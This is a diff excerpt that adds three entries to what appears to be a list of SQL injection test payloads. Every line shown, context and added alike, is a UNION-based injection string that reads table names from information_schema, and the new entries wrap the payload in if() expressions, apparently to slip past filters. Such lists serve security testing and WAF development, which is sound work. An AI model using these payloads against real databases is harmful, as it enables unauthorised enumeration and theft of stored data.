@@ -494,3 +494,8 @@ sin(1)-1 group by 1 union select 1--
 -1 union distinct all select table_name from information_schema.tables
 -1 union all distinct select table_name from information_schema.tables
 -1 union all select table_name from information_schema.tables
+
+# more
+if(1, -1, 2) union select table_name from information_schema.tables limit 1
+if((1), -1, 2) union select table_name from information_schema.tables limit 1
+if(1=2, -1, 2) union select table_name from information_schema.tables limit 1
